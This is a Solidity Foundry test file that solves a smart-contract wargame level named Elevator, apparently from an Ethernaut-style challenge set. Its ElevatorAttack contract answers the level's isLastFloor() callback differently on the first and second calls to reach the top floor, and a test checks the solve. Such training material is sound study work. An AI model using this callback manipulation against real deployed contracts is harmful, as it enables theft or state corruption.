// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Elevator} from "src/levels/Elevator.sol";
import {ElevatorFactory} from "src/levels/ElevatorFactory.sol";

contract ElevatorAttack {
    bool private called;

    function isLastFloor(uint256) external returns (bool) {
        // goTo() memanggil isLastFloor() DUA kali: sekali di `if`, sekali
        // untuk menetapkan `top`. Jawab berbeda tiap panggilan.
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }

    function attack(address elevator) external {
        Elevator(elevator).goTo(1);
    }
}

contract ElevatorSolve is Test {
    ElevatorFactory factory;
    Elevator instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new ElevatorFactory();
        instance = Elevator(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        ElevatorAttack attack = new ElevatorAttack();
        attack.attack(address(instance));
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
